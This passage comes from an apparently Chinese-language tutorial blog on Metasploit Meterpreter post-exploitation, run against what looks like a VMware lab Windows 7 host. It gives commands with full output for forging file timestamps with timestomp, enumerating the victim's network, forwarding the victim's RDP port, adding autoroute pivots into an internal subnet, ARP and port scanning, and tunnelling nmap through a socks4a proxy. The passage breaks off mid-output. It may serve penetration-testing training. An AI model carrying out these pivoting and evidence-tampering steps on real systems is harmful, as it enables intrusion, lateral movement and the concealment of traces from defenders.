C://2.txt</span><br><span class="line">Modified      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Accessed      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-18 00:48:10 -0500</span><br><span class="line">meterpreter &gt; timestomp -v C://1.txt</span><br><span class="line">[*] Showing MACE attributes for C://1.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br><span class="line">meterpreter &gt; timestomp C://2.txt -f C://1.txt</span><br><span class="line">[*] Pulling MACE attributes from C://1.txt</span><br><span class="line">[*] Setting specific MACE attributes on C://2.txt</span><br><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for C://2.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br></pre></td></tr></table></figure><h2><span id="网络命令">网络命令</span></h2><h3><span id="基本网络命令">基本网络命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:a7</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.130.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::c55f:725f:9e7d:7056</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:16ab</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:8280</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Teredo Tunneling Pseudo-Interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::100:7f:fffe</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:b1</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.22.171</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::b96b:f6e6:3371:444f</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address                    Remote address       State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------                    --------------       -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135                      0.0.0.0:*            LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445                      0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:554                      0.0.0.0:*            LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp    0.0.0.0:5357                     0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:49152                    0.0.0.0:*            LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp    0.0.0.0:49153                    0.0.0.0:*            LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49154                    0.0.0.0:*            LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49171                    0.0.0.0:*            LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp    0.0.0.0:49176                    0.0.0.0:*            LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp    0.0.0.0:49179                    0.0.0.0:*            LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    tcp    192.168.22.171:139               0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    192.168.22.171:58500             192.168.22.170:4444  ESTABLISHED  0     0      2876/vmtoolsd.exe</span><br><span class="line">    tcp    192.168.22.171:58879             192.168.22.170:4444  ESTABLISHED  0     0      1684/shell.exe</span><br><span class="line">    tcp    192.168.130.128:139              0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::135                           :::*                 LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp6   :::445                           :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::554                           :::*                 LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp6   :::3587                          :::*                 LISTEN       0     0      3824/svchost.exe</span><br><span class="line">    tcp6   :::5357                          :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::49152                         :::*                 LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp6   :::49153                         :::*                 LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp6   :::49154                         :::*                 LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp6   :::49171                         :::*                 LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp6   :::49176                         :::*                 LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp6   :::49179                         :::*                 LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    udp    0.0.0.0:123                      0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:500                      0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:4500                     0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    0.0.0.0:5004                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5005                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp    0.0.0.0:5355                     0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:52358                    0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    0.0.0.0:58751                    0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    0.0.0.0:62445                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    0.0.0.0:65389                    0.0.0.0:*                         0     0      248/svchost.exe</span><br><span class="line">    udp    127.0.0.1:1900                   0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:50203                  0.0.0.0:*                         0     0      508/lsass.exe</span><br><span class="line">    udp    127.0.0.1:52360                  0.0.0.0:*                         0     0      648/svchost.exe</span><br><span class="line">    udp    127.0.0.1:55889                  0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    127.0.0.1:64192                  0.0.0.0:*                         0     0      900/svchost.exe</span><br><span class="line">    udp    192.168.22.171:137               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:138               0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.22.171:1900              0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.22.171:55887             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:137              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:138              0.0.0.0:*                         0     0      4/System</span><br><span class="line">    udp    192.168.130.128:1900             0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp    192.168.130.128:55888            0.0.0.0:*                         0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::123                           :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::500                           :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::3540                          :::*                              0     0      3824/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::4500                          :::*                              0     0      900/svchost.exe</span><br><span class="line">    udp6   :::5004                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5005                          :::*                              0     0      1780/wmpnetwk.exe</span><br><span class="line">    udp6   :::5355                          :::*                              0     0      648/svchost.exe</span><br><span class="line">    udp6   :::52359                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   :::62446                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   :::65390                         :::*                              0     0      248/svchost.exe</span><br><span class="line">    udp6   ::1:1900                         :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   ::1:55886                        :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::b96b:f6e6:3371:444f:55884  :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:546    :::*                              0     0      772/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:1900   :::*                              0     0      1260/svchost.exe</span><br><span class="line">    udp6   fe80::c55f:725f:9e7d:7056:55885  :::*                              0     0      1260/svchost.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    192.168.22.2     00:50:56:f2:7a:67  14</span><br><span class="line">    192.168.22.170   00:0c:29:92:d5:46  14</span><br><span class="line">    192.168.22.254   00:50:56:f5:66:dc  14</span><br><span class="line">    192.168.22.255   ff:ff:ff:ff:ff:ff  14</span><br><span class="line">    192.168.130.129  00:0c:29:74:6d:d0  11</span><br><span class="line">    192.168.130.254  00:50:56:f7:97:52  11</span><br><span class="line">    192.168.130.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  14</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  14</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  14</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  14</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getproxy </span><br><span class="line">Auto-detect     : Yes</span><br><span class="line">Auto config URL : </span><br><span class="line">Proxy URL       : </span><br><span class="line">Proxy Bypass    : </span><br><span class="line">meterpreter &gt; route</span><br><span class="line"></span><br><span class="line">IPv4 network routes</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Subnet           Netmask          Gateway          Metric  Interface</span><br><span class="line">    ------           -------          -------          ------  ---------</span><br><span class="line">    0.0.0.0          0.0.0.0          192.168.22.2     10      14</span><br><span class="line">    127.0.0.0        255.0.0.0        127.0.0.1        306     1</span><br><span class="line">    127.0.0.1        255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    127.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    192.168.22.0     255.255.255.0    192.168.22.171   266     14</span><br><span class="line">    192.168.22.171   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.22.255   255.255.255.255  192.168.22.171   266     14</span><br><span class="line">    192.168.130.0    255.255.255.0    192.168.130.128  266     11</span><br><span class="line">    192.168.130.128  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    192.168.130.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        127.0.0.1        306     1</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.130.128  266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.22.171   266     14</span><br><span class="line">    255.255.255.255  255.255.255.255  127.0.0.1        306     1</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.130.128  266     11</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.22.171   266     14</span><br><span class="line"></span><br><span class="line">No IPv6 routes were found.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h4><span id="portfwd端口转发">portfwd端口转发</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口删除</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :6666 &lt;-&gt; 127.0.0.1:3389</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd delete -l 6666 -p 3389 -r 127.0.0.1</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote          Direction</span><br><span class="line">   -----  -----         ------          ---------</span><br><span class="line">   1      0.0.0.0:6666  127.0.0.1:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd flush</span><br><span class="line">[*] Successfully stopped TCP relay on 0.0.0.0:6666</span><br><span class="line">[*] Successfully flushed 1 rules</span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"></span><br><span class="line">No port forwards are currently active.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# rdesktop 127.0.0.1:6666</span><br><span class="line">Failed to negotiate protocol, retrying with plain RDP.</span><br><span class="line">WARNING: Remote desktop does not support colour depth 24; falling back to 16</span><br></pre></td></tr></table></figure><h4><span id="autoroute添加路由">autoroute添加路由</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 192.168.130.0/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.130.0/255.255.255.0 via 192.168.22.171</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.130.0      255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>然后可以利用<code>arp_scanner</code>、<code>portscan</code>等进行扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.130.0/24</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] ARP Scanning 192.168.130.0/24</span><br><span class="line">[+] IP: 192.168.130.1 MAC 00:50:56:c0:00:02 (VMware, Inc.)</span><br><span class="line">[+] IP: 192.168.130.128 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] IP: 192.168.130.129 MAC 00:0c:29:74:6d:d0 (VMware, Inc.)</span><br><span class="line">[+] IP: 192.168.130.255 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)</span><br><span class="line">[+] IP: 192.168.130.254 MAC 00:50:56:f7:97:52 (VMware, Inc.)</span><br></pre></td></tr></table></figure><h4><span id="socks4a代理">Socks4a代理</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; set srvhost 127.0.0.1</span><br><span class="line">msf &gt; set srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gedit /etc/proxychains.conf </span><br><span class="line"></span><br><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sV 192.168.130.129</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-18 03:19 EST</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.130.129:49154-&lt;&gt;&lt;&gt;-OK</span><br><span 